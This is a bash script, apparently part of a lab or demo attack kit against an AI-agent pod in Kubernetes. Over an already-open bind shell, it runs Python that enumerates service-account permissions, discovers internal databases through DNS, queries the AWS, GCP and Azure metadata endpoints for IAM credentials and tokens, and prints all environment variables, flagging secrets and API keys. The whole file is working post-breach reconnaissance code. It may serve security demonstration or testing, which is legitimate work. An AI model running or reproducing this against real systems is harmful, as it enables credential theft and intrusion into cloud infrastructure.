#!/usr/bin/env bash
# Reconnaissance: enumerate SA permissions, discover services via DNS,
# probe cloud metadata, and dump environment variables.
# Read-only — no side effects on the target.
set -euo pipefail

if [[ "${1:-}" == "--help" ]]; then
  echo "Usage: attack-recon.sh"
  echo "  Runs reconnaissance on the agent pod to map the blast radius."
  echo "  Enumerates RBAC permissions, discovers internal services via DNS,"
  echo "  probes cloud metadata endpoints, and dumps environment variables."
  echo ""
  echo "  Requires: bind shell open (run trigger.sh + wait-shell.sh first)"
  echo ""
  echo "Environment:"
  echo "  AGENT_NS     agent namespace (default: agent-namespace)"
  echo "  BIND_PORT    bind shell port (default: 4444)"
  exit 0
fi

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/lib.sh"

banner "Post-Breach: Reconnaissance"

PYTHON_CODE="${K8S_API_PREAMBLE}

print('=' * 60)
print('  RECON: SA Permission Enumeration')
print('=' * 60)

for ns in ['target-apps', 'default', 'kube-system', os.environ.get('NAMESPACE', 'agent-namespace')]:
    body = {
        'apiVersion': 'authorization.k8s.io/v1',
        'kind': 'SelfSubjectRulesReview',
        'spec': {'namespace': ns}
    }
    result, status = k8s_post('/apis/authorization.k8s.io/v1/selfsubjectrulesreviews', body)
    if status == 201:
        rules = result.get('status', {}).get('resourceRules', [])
        if rules:
            print(f'  [{ns}] {len(rules)} rules:')
            for r in rules[:10]:
                verbs = ','.join(r.get('verbs', []))
                resources = ','.join(r.get('resources', []))
                print(f'    {verbs} -> {resources}')
            if len(rules) > 10:
                print(f'    ... and {len(rules) - 10} more')
        else:
            print(f'  [{ns}] no rules')
    else:
        print(f'  [{ns}] error: HTTP {status}')

print()
print('=' * 60)
print('  RECON: DNS Service Discovery')
print('=' * 60)

services = ['postgres', 'postgresql', 'mysql', 'redis', 'mongodb',
            'elasticsearch', 'rabbitmq', 'kafka', 'neo-ui', 'collector']
namespaces = ['target-apps', 'default', 'monitoring', 'monitoring-system',
              os.environ.get('NAMESPACE', 'agent-namespace')]
found = []
for svc in services:
    for ns in namespaces:
        fqdn = f'{svc}.{ns}.svc.cluster.local'
        try:
            ip = socket.getaddrinfo(fqdn, None)[0][4][0]
            found.append((svc, ns, ip))
            print(f'  FOUND: {svc}.{ns} -> {ip}')
        except socket.gaierror:
            pass

if not found:
    print('  No services discovered.')

print()
print('=' * 60)
print('  RECON: Cloud Metadata Probe')
print('=' * 60)

endpoints = [
    ('AWS', '169.254.169.254', '/latest/meta-data/iam/security-credentials/'),
    ('GCP', 'metadata.google.internal', '/computeMetadata/v1/instance/service-accounts/default/token'),
    ('Azure', '169.254.169.254', '/metadata/instance?api-version=2021-02-01'),
]
for cloud, host, path in endpoints:
    try:
        c = http.client.HTTPConnection(host, timeout=2)
        h = {'Metadata-Flavor': 'Google'} if cloud == 'GCP' else {'Metadata': 'true'} if cloud == 'Azure' else {}
        c.request('GET', path, headers=h)
        r = c.getresponse()
        print(f'  {cloud}: HTTP {r.status} ({len(r.read())} bytes)')
    except Exception as e:
        print(f'  {cloud}: unreachable ({type(e).__name__})')

print()
print('=' * 60)
print('  RECON: Environment Variables')
print('=' * 60)

sensitive_keys = ['TOKEN', 'SECRET', 'PASSWORD', 'KEY', 'API', 'CREDENTIAL', 'AUTH', 'ANTHROPIC']
for k, v in sorted(os.environ.items()):
    marker = ' <<<' if any(s in k.upper() for s in sensitive_keys) else ''
    display_v = v[:80] + '...' if len(v) > 80 else v
    print(f'  {k}={display_v}{marker}')

print()
print('Recon complete.')
"

echo "  Piping recon script to agent pod..."
echo ""
run_on_agent "$PYTHON_CODE"
echo ""
echo "Reconnaissance complete."
